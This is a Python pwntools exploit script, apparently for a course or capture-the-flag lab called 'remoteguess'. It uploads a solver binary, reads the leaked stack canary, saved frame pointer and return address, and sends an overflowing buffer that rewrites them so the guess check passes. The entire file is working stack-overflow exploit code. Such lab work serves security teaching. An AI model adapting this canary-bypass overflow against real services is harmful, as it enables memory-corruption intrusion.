#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)  # printf("Send me your code (%d bytes): ", bytes);
    #print(payload)


    r.recvuntil(b'canary : ')
    canary = int(r.recvline(), 16)
    r.recvuntil(b'rbp : ')
    rbp = int(r.recvline(), 16)
    r.recvuntil(b'return_addr : ')
    return_addr = int(r.recvline(), 16)
    
    myguess = 1010       # 0x03f2
    temp = p64(canary) + p64(rbp) + p64(return_addr)
    buf = str(myguess).encode('ascii').ljust(24, b'\0') + temp + b'\0'*12 + p32(myguess)

    print(buf)
    r.sendlineafter(b'Show me your answer? ', buf)
    
    
    
else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
